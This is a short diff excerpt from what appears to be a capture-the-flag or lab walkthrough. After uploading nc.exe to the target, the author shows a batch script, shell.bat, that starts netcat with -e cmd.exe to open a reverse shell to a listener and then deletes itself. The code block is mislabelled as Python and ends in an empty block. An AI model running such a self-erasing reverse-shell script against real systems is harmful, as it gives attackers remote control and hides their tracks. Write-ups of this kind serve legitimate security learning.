@@ -446,3 +446,14 @@ Info: Upload successful!
 ```
 First ill upload `nc.exe` to the target
 
+```python
+cat shell.bat 
+@echo off                                                
+start /b C:\programdata\nc.exe 127.0.0.1 1337 -e cmd.exe                                                           
+start /b "" cmd /c del "%~f0"&exit /b
+```
+Ill make a batch script on my system
+
+```python
+
+```
